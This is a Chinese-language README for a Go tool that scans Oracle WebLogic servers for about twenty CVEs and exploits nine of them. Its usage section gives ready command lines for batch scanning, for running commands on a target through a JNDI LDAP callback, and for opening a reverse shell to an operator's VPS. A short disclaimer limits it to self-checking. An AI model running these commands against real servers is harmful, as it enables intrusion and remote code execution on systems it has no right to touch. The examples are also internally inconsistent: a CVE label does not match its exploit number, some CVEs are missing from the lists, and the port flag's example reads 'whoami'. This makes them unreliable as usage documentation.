# 👻WeblogicScan.go

只是好好的集成了一下，方便和我一样的懒人。

目前可检测的POC

```go
CVE-2014-4210
CVE-2016-0638
CVE-2016-3510
CVE-2017-10271
CVE-2017-3248
CVE-2017-3506
CVE-2018-2628
CVE-2018-2893
CVE-2018-2894
cve-2018-3191
cve-2018-3245
cve-2018-3252
CVE-2019-2725
CVE-2019-2729
CVE-2019-2890
cve-2020-2551
cve-2020-2555
cve-2020-2883
cve-2020-14750
cve-2020-14882
cve-2020-14883
cve-2023-21839
```

目前可利用的EXP

```go
CVE-2016-0638
CVE-2016-3510
CVE-2017-3248
CVE-2018-2628
CVE-2018-2893
CVE-2020-14882
cve-2020-2555
cve-2020-2883
cve-2023-21839
```

# 🐳使用示例

```md
-u url
  you target, example: 127.0.0.1
-p Port
  you target Port, example: "whoami"
-e EXP
  Exploitation alone, example: ""
-l ldap
  ldap server, example: "ldap://127.0.0.1/#eval"
-ri rip
  reverse ip
-rp rport
  reverse port
```

+ POC一键检测
```go
WeblogicScanner.exe -u 127.0.0.1 -p 7001 -l ldap://127.0.0.1/#eval
```

+ 批量检测
```go
WeblogicScanner.exe -f "C:\Users\Test\Desktop\target.txt" -p 7001 -l ldap://127.0.0.1/#eval
```

+ EXP单个利用，指定EXP末尾数字即可
```go
//CVE-2023-21839
WeblogicScanner.exe -u 127.0.0.1 -p 7001 -l ldap://127.0.0.1/#eval -e 14882

//cve-2020-2883
//cve-2020-2555
//cve-2016-0638
//cve-2016-0315
//cve-2017-3248
//cve-2018-2628
//cve-2018-2893
//cve-2020-14882
WeblogicScanner.exe -u 127.0.0.1 -p 7001 -c calc.exe -e 2883

//cve-2020-2889
WeblogicScanner.exe -u 127.0.0.1 -p 7001 -c -ri <vps_ip> -rp <VPS_PORT> -e 2889
```

# 👮免责声明

该工具仅用于安全自查检测

由于传播、利用此工具所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。

本人拥有对此工具的修改和解释权。未经网络安全部门及相关部门允许，不得善自使用本工具进行任何攻击活动，不得以任何方式将其用于商业目的。

# 📷参考

https://github.com/0xn0ne/weblogicScanner

https://github.com/rabbitmask/WeblogicScan

https://github.com/4ra1n/CVE-2023-21839